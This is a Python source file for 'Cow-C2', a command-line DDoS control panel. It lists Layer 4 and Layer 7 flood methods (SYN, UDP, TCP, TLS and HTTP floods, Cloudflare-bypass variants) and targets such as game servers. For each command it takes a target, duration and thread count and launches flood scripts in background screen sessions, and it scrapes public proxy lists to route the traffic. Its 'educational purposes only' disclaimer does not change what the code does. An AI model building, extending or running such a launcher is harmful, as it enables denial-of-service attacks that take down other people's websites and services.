import aiohttp
import asyncio
import multiprocess
import socket
import socks
import random
import threading
import ssl
from datetime import *
import datetime
from shutil import which
from urllib import parse
from os import system
import subprocess
import random
import os
import sys
import time
import json
import re
import time
from time import *
from time import sleep
import colorama
import requests
import httpx
import getpass
import screen
from colorama import *
import progressbar
from tqdm import tqdm

def dt():
   now = datetime.datetime.now()
   print(now.strftime(Color.LC+f"Time: "+Color.LW+"%y-%m-%d %H:%M:%S"))

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def wc():
    e1 = "\nWelcome to "
    e2 = "Cow-C2."
    for e in e1:
      print(Color.LR+e, end='')
      sys.stdout.flush()
      sleep(0.05)
    
    for ez in e2:
      print(Color.LG+ez, end='')
      sys.stdout.flush()
      sleep(0.3)
        
def pgrs():
      
    widgets = [Color.LY+f'Configuring script: '+Color.RESET, progressbar.AnimatedMarker()]
    print(Color.LM+"Maybe take some time, please wait.")
    bar = progressbar.ProgressBar(widgets=widgets).start()
      
    for i in range(100):
        sleep(0.1)
        bar.update(i)         
   
class Color:
	colorama.init(autoreset=True)
	LB = colorama.Fore.LIGHTBLUE_EX
	LC = colorama.Fore.LIGHTCYAN_EX
	LG = colorama.Fore.LIGHTGREEN_EX
	LR = colorama.Fore.LIGHTRED_EX
	LM = colorama.Fore.LIGHTMAGENTA_EX
	LW = colorama.Fore.LIGHTWHITE_EX
	LY = colorama.Fore.LIGHTYELLOW_EX
	RESET = colorama.Fore.RESET

http = open('proxies/http.txt').readlines()
socks4 = open('proxies/socks4.txt').readlines()
socks5 = open('proxies/socks5.txt').readlines()
useragent = open('ua/ua.txt').readlines()
useragent = open('ua/useragents.txt').readlines()
useragent = open('ua/uaex.txt').readlines()
http  = len(http)
socks4  = len(socks4)
socks5  = len(socks5)
ua = len(useragent)
def si():
    print(Color.LC+"Private"+Color.LY+"by"+Color.LR+"NA")
    dt()
    
def count():
    print(Color.LG+f" Proxy HTTP: "+Color.LR+f"["+Color.LW+f"{http}"+Color.LR+"]\n"+Color.LG+f" Proxy SOCKS4: "+Color.LR+f"["+Color.LW+f"{socks4}"+Color.LR+"]\n"+Color.LG+f" Proxy SOCKS5: "+Color.LR+f"["+Color.LW+f"{socks5}"+Color.LR+"]\n"+Color.LG+f" Useragent: "+Color.LR+f"["+Color.LW+f"{ua}"+Color.LR+"]\n"+Color.LG+f" Online: "+Color.LR+f"["+Color.LW+f"1"+Color.LR+"]\n"+Color.LG+f" Power: "+Color.LR+f"["+Color.LW+f"Weak"+Color.LR+"]\n"+Color.LG+f" Plan: "+Color.LR+f"["+Color.LW+f"Admin"+Color.LR+"]\n")

def tools():
    clear()
    si()
    count()
    print(Color.LG+" .{tools}  "+Color.LC+"to use")
    print(Color.LR+"["+Color.LW+"01"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"pingtcp"+Color.LR+"       ---->Check tcp ping your inet to server")
    print(Color.LR+"["+Color.LW+"02"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"pr/all"+Color.LR+"        ---->Auto get proxy public(99.7%)/private(0.3%) ")
    print(Color.LR+"["+Color.LW+"03"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"pr/http"+Color.LR+"       ---->Auto get proxy http ")
    print(Color.LR+"["+Color.LW+"04"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"pr/socks4"+Color.LR+"     ---->Auto get proxy socks4 ")
    print(Color.LR+"["+Color.LW+"05"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"pr/socks5"+Color.LR+"     ---->Auto get proxy socks5 ")
    print(Color.LR+"["+Color.LW+"06"+Color.LR+"]  "+Color.LR+"["+Color.LC+"Support"+Color.LR+"]   "+Color.LY+"check"+Color.LR+"         ---->Check proxy live ")

def ports():
    clear()
    si() 
    count()
    print(Color.LR+"["+Color.LW+"HTTP"+Color.LR+"] "+Color.LC+"        80")
    print(Color.LR+"["+Color.LW+"HTTPS"+Color.LR+"] "+Color.LC+"       443")
    print(Color.LR+"["+Color.LW+"SSH"+Color.LR+"] "+Color.LC+"         22")
    print(Color.LR+"["+Color.LW+"DNS"+Color.LR+"] "+Color.LC+"         53")
    print(Color.LR+"["+Color.LW+"SFTP"+Color.LR+"] "+Color.LC+"        21")
    print(Color.LR+"["+Color.LW+"TFTP"+Color.LR+"] "+Color.LC+"        69")
    print(Color.LR+"["+Color.LW+"SMTP"+Color.LR+"] "+Color.LC+"        25")
    print(Color.LR+"["+Color.LW+"MINECRAFT"+Color.LR+"] "+Color.LC+"   25565")
    print(Color.LR+"["+Color.LW+"FIVEM"+Color.LR+"] "+Color.LC+"       30120")
    print(Color.LR+"["+Color.LW+"XBOX"+Color.LR+"] "+Color.LC+"        3074")
    print(Color.LR+"["+Color.LW+"PLAYSTATION"+Color.LR+"] "+Color.LC+" 5060")
    print(Color.LR+"["+Color.LW+"RIP"+Color.LR+"] "+Color.LC+"         5060")
    print(Color.LR+"["+Color.LW+"TELNET"+Color.LR+"] "+Color.LC+"      23")
    print(Color.LR+"["+Color.LW+"MINECRAFT"+Color.LR+"] "+Color.LC+"   25")
    
def layer7():
    clear()
    si()
    count()
    print(Color.LC+"LAYER 7 NORMAL")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"httpflood"+Color.LR+"    ---->HTTP-FLOOD")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"ban"+Color.LR+"          ---->MIX-FLOOD")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"raw"+Color.LR+"          ---->RAW-FLOOD ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"rand"+Color.LR+"         ---->RAND-FLOOD ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"request"+Color.LR+"      ---->REQUEST-FLOOD ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"socket"+Color.LR+"       ---->SOCKET-FLOOD ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"dude"+Color.LR+"         ---->DUDE-BYPASS ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"1/duck"+Color.LR+"       ---->1/DUCK ")
    print(Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"2/duck"+Color.LR+"       ---->2/UP/DUCK \n")
    print(Color.LC+"LAYER 7 VIP")
    print(Color.LR+"["+Color.LB+"VIP"+Color.LR+"]   "+Color.LY+"   get"+Color.LR+"            ---->GET-FLOOD ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   post"+Color.LR+"           ---->POST-FLOOD ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   cfb"+Color.LR+"            ---->CFB ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   1/socket"+Color.LR+"       ---->SOCKETS/1.1 ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   1/http"+Color.LR+"         ---->HTTP/1.1 ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   2/http"+Color.LR+"         ---->HTTP/2.2 ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   2/tls"+Color.LR+"          ---->TLS/2 ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   zeus"+Color.LR+"           ---->CC-FLOOD ")    
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   joke"+Color.LR+"           ---->JOKER-FLOOD ")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   uam"+Color.LR+"            ---->BYPASS-UAM (vip but stupid, trash methods) ")  
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   hades"+Color.LR+"          ---->HADES-KILL")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   tls/flood"+Color.LR+"      ---->TLS/FLOOD")
    print(Color.LR+"["+Color.LB+f"VIP"+Color.LR+"]   "+Color.LY+"   cat/"+Color.LR+"           ---->CAT-BYPASS")
    

  

def layer4():
    clear()
    si()
    count()
    print(Color.LC+"LAYER 4 NORMAL")
    print(Color.LR+"["+Color.LW+"01"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  syn"+Color.LR+"      ---->SYN-FLOOD ")
    print(Color.LR+"["+Color.LW+"02"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  vse"+Color.LR+"      ---->VSE-FLOOD to /Valve Source Engine/")
    print(Color.LR+"["+Color.LW+"03"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  flood"+Color.LR+"    ---->HTTP-FLOOD ")
    print(Color.LR+"["+Color.LW+"04"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  tcp"+Color.LR+"      ---->TCP-FLOOD ")
    print(Color.LR+"["+Color.LW+"05"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  udp"+Color.LR+"      ---->UDP-FLOOD ")
    print(Color.LR+"["+Color.LW+"06"+Color.LR+"]  "+Color.LR+"["+Color.LC+"NORMAL"+Color.LR+"]   "+Color.LY+"  home"+Color.LR+"     ---->HOME-FLOOD ")



    
def menu():
    clear()
    si()
    print(Color.LG+".help "+Color.LC+"to show the commands")
    print(Color.LG+"\|/"+Color.LW+"     (__)")
    print(Color.LW+" `\–––––(oo)")
    print(Color.LW+"   ||   (__)")
    print(Color.LW+"   ||w––||     "+Color.LG+"\|/")
    print(Color.LG+"\|/")  
    print(Color.LC+"Founder: "+Color.LR+"na/aqz")
    print(Color.LC+"Source: "+Color.LR+"by FT, ZC")
    print(Color.LC+"Version: "+Color.LR+"1.1.1")    
    print(Color.LC+"Report/dm/telegram: "+Color.LY+"@aqz")
    print(Color.LY+"\n⚠️ Disclaimer: "+Color.LR+"Cowww is just a simple DoS tools for test capacity of your website.  And for educational and research purposes only.  We dont take any responsibility if you use it for bad purposes and abuse it.\n")
    
    
def main():
    menu()
    while True:
        cnc = input(Color.LG+"\n\n╔═══"+Color.LW+"aqzxt"+Color.LG+"@"+Color.LW+"cow"+Color.LM+"\n╚══"+Color.LY+"×͜×"+Color.LC+"  # "+Color.RESET)
        http_proxy1 = "https://www.proxy-list.download/api/v1/get?type=http&anon=elite"
        http_proxy2 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
        http_proxy2x = "https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous"
        http_proxy3 = "https://www.proxy-list.download/api/v1/get?type=socks5&anon=elite"
        http_proxy4 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=sock5&timeout=10000&country=all&ssl=all&anonymity=all"
        http_proxy4x = "https://www.proxy-list.download/api/v1/get?type=socks5&anon=anonymous"
        http_proxy5 = "https://www.proxy-list.download/api/v1/get?type=socks4&anon=elite"
        http_proxy6 = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all&ssl=all&anonymity=all"
        http_proxy6x = "https://www.proxy-list.download/api/v1/get?type=socks4&anon=anonymous"
        if cnc == ".layer7" or cnc == ".LAYER7" or cnc == ".L7" or cnc == ".l7":
            layer7()
        elif cnc == ".layer4" or cnc == ".LAYER4" or cnc == ".L4" or cnc == ".l4":
            layer4()
        elif cnc == ".ports" or cnc == ".port" or cnc == ".PORTS" or cnc == ".PORT":
            ports()
        elif cnc == ".tools" or cnc == ".tool" or cnc == ".TOOLS" or cnc == ".TOOL":
            tools()
        elif cnc == ".menu" or cnc == ".MENU":
            menu()

# LAYER 4 METHODS   
        elif ".vse" in cnc:
             try:    
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]                    
                os.system(f'screen -dm node L4/vse {ip} {port} {time} {threads}')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" VSE ")
                         
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".vse ip port time threads")
                print(Color.LC+f".vse 1.1.1.1 80 100 100")
                
        elif ".syn" in cnc:
             try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]                                 
                os.system(f'screen -dm node L4/syn {ip} {port} {time} {threads}')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" SYN ")
                        
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")            
                print(Color.LR+f".syn ip port time threads")
                print(Color.LC+f".syn 1.1.1.1 80 100 100")             
                              
        elif ".tcp" in cnc:
             try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[5]            
                size = cnc.split()[4]                                
                os.system(f'screen -dm node L4/tcp {ip} {port} {time} {size} {threads}')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" TCP ")
                        
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")           
                print(Color.LR+f".tcp ip port time threads size")
                print(Color.LC+f".tcp 1.1.1.1 80 100 100 100")
                                                     
        elif ".udp" in cnc:
             try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[5]           
                size = cnc.split()[4]                                      
                os.system(f'screen -dm node L4/udp {ip} {port} {time} {size} {threads}')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" UDP")
                       
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".udp ip port time threads size")
                print(Color.LC+f".udp 1.1.1.1 80 100 100 100")
                
        elif ".flood" in cnc:
             try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                threads = cnc.split()[4]                                              
                os.system(f'screen -dm node L4/http {ip} {port} {time} {threads}')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HTTP ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".flood ip port time threads")
                print(Color.LC+f".flood 1.1.1.1 80 100 100")                
                
        elif ".home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]              
                os.system(f'screen -dm go run L4/stress.go {ip} {port} {mode} 1000 1000 1000')
                print(Color.LG+"Target:"+Color.LW+f" {ip}:{port} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HOME ")
                        
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".home ip port mode(tcp/udp/http)")
                print(Color.LC+f".home 1.1.1.1 80 http")
                                                                                                                                                                                                                                                                                                                                                                      
                
# LAYER 7 METHODS
 
        elif ".get" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm python3 L7/get.py {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" GET")               
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".get url time")
                print(Color.LC+f".get https://example.com 100")
                
        elif ".request" in cnc:
            try:                
                url = cnc.split()[1]
                time = cnc.split()[2]
                req = cnc.split()[3]            
                proxy = cnc.split()[4]
                os.system(f'screen -dm node L7/request.js {url} {time} {req} {proxy}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" REQUEST")                
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".request url time req_per_ip proxy")
                print(Color.LC+f".request https://example.com 100 64 http.txt")
    
        elif ".cfb" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/cfb.js {url} {time} {proxy} ua/ua.txt')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" CFB ")                
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".cfb url time proxy")
                print(Color.LC+f".cfb https://example.com 100 http.txt")
                 
        elif ".raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node L7/raw.js {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" RAW ")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".raw url time")
                print(Color.LC+f".raw https://example.com 100")

        elif ".rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node L7/rand.js {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" RAND ")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".rand url time")
                print(Color.LC+f".rand https://example.com 100")
                
        elif ".dude" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm python3 L7/dudex.py {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" DUDE")                
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".dude url time")
                print(Color.LC+f".dude https://example.com 100")
                
        elif ".post" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm python3 L7/post.py {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" POST")               
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".post url time")
                print(Color.LC+f".post https://example.com 100")
                
        elif ".httpflood" in cnc:
            try:
                url = cnc.split()[1]                
                time = cnc.split()[4]               
                threads = cnc.split()[2]            
                method = cnc.split()[3]
                header = cnc.split()[5]                                
                os.system(f'screen -dm go run L7/httpflood.go {url} {threads} {method} {time} {header}')    
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HTTP-FLOOD ")                
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".httpflood url threads get/post time header.txt/off ")
                print(Color.LC+f".httpflood https://example.com 100 get 100 header.txt")
                
        elif ".socket" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                req = cnc.split()[3]
                os.system(f'screen -dm node L7/socketf.js {url} {time} {req}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" SOCKETS ")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".socket url time req_per_ip")
                print(Color.LC+f".socket https://example.com 100 64")
                
        elif ".1/duck" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node L7/duck1.js {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" DUCK/1")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".1/duck url time")
                print(Color.LC+f".1/duck https://example.com 100")
                
                
        elif ".2/duck" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'screen -dm node L7/duck2.js {url} {time}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" DUCK/2 ")
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")                          
                print(Color.LR+f".2/duck url time")
                print(Color.LC+f".2/duck https://example.com 100")   
                
        elif ".zeus" in cnc:
            try:
                url = cnc.split()[1]       
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                type = cnc.split()[4]              
                os.system(f'screen -dm python3 L7/zeus.py -url {url} -s {time} -f {proxy} -v {type} -b 1 -m cc -t 1000')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" ZEUS ")                
            except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".zeus url time proxy type")
                print(Color.LC+f".zeus https://example.com 100 http.txt http")
                                
        elif ".1/socket" in cnc:
             try:
                url = cnc.split()[1]                   
                time = cnc.split()[2]                                              
                proxy = cnc.split()[3]
                subprocess.run([f'screen -dm node L7/socket {url} {proxy} {time} 64'], shell=True)
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" SOCKET/1.1 ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".1/socket url time proxy")
                print(Color.LC+f".1/socket https://example.com 100 http.txt")
                
        elif ".1/http" in cnc:
             try:
                url = cnc.split()[1]                      
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/https1.js GET {url} {proxy} {time} 64 6')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HTTPS/1.1 ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")    
                print(Color.LR+f".1/http url time proxy ")
                print(Color.LC+f".1/http https://example.com 100 http.txt")
                
        elif ".2/http" in cnc:
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]                 
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/https2.js GET {url} {proxy} {time} 64 6')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HTTPS/2.2 ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".2/http url time proxy")
                print(Color.LC+f".2/http https://example.com 100 proxy")
                
                
        elif ".joke" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/joke.js {url} {time} {proxy}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" JOKE ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".joke url time proxy")
                print(Color.LC+f".joke https://example.com 100 http.txt")

        elif ".ban" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]                  
                os.system(f'screen -dm node L7/mix.js {url} {time} 64')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" BAN ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")                  
                print(Color.LR+f".ban url time")
                print(Color.LC+f".ban https://example.com 100")                 
                                                                                        
        elif ".uam" in cnc:
             try:
                url = cnc.split()[1]  
                time = cnc.split()[2]                     
                req = cnc.split()[3]
                proxy = cnc.split()[4]
                os.system(f'screen -dm node L7/uam.js {url} {time} {req} {proxy}')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" UAM ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".uam url time req_per_ip http.txt")
                print(Color.LC+f".uam https://example.com 100 64 http.txt")             
                    
        elif ".2/tls" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/2tls.js {url} {time} {proxy} ua/ua.txt')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" TLS/2.2 ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".2/tls url time proxy")
                print(Color.LC+f".2/tls https://example.com 100 http.txt")         
                
        elif ".hades" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/hades.js GET {url} {proxy} {time} 64 6')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" HADES ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".hades url time proxy")
                print(Color.LC+f".hades https://example.com 100 http.txt")          
                
        elif ".tls/flood" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/tlsflood.js  {url} 6 64 GET {time} {proxy} ua/ua.txt')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" TLS/FLOOD ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".tls/flood url time proxy")
                print(Color.LC+f".tls/flood https://example.com 100 http.txt")                    
                                                                                                
        elif ".cat/" in cnc:           
             try:
                url = cnc.split()[1]    
                time = cnc.split()[2]
                proxy = cnc.split()[3]
                os.system(f'screen -dm node L7/cat.js {url} {time} 6 {proxy} ')
                print(Color.LG+"Target:"+Color.LW+f" {url} ")
                print(Color.LG+"Time:"+Color.LW+f" {time} ")
                print(Color.LG+"Method:"+Color.LR+" CAT-BYPASS ")
             except:
                print(Color.LR+f"Error:"+Color.LW+" something went wrong or may not work at this time. Please try later.")
                print(Color.LR+f".cat/ url time proxy")
                print(Color.LC+f".cat/ https://example.com 100 http.txt")                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 
# TOOLS
               
        elif "clear" in cnc:
            try:
                os.system("clear")
                si()
            except:
                print('Usage: clear')               
        elif "clr" in cnc:
            try:
                os.system("clear")
            except:
                print('Usage: clear')

        elif ".pr/all" in cnc:
            try:
                os.system("python3 Tools/proxy.py")
            except:
                print('Usage: proxyget')
                print(Color.LR+"Attention: Error null, try in file")

        elif ".pingtcp" in cnc:
            try:
                os.system("python3 Tools/tcpping.py")
            except:
                print('Usage: pingtcp')
        elif ".stop" in cnc:     
            try:
                os.system(f'pkill screen')
                print(Color.LR+f"[!]"+Color.LG+"Attack has stopped!")
            except:
                print(f'kill failed')
        
        elif ".pr/http" in cnc:     
            try:       
                print(Color.LG+"proxy getting please wait...")
                with open("proxies/http.txt", 'w') as p:  
                       p.write(httpx.get(http_proxy1).text) 
                       p.write(httpx.get(http_proxy2).text) 
                       p.write(httpx.get(http_proxy2x).text) 
                print(Color.LG+"Done, proxy save as proxies/http.txt")
            except:
                print(f'Error')
        
        elif ".pr/socks4" in cnc:     
            try:       
                print(Color.LG+"proxy getting please wait...")
                with open("proxies/socks4.txt", 'w') as p:  
                       p.write(httpx.get(http_proxy5).text) 
                       p.write(httpx.get(http_proxy6).text)
                       p.write(httpx.get(http_proxy6x).text)
                print(Color.LG+"Done, proxy save as proxies/socks4.txt")
            except:
                print(f'Error')

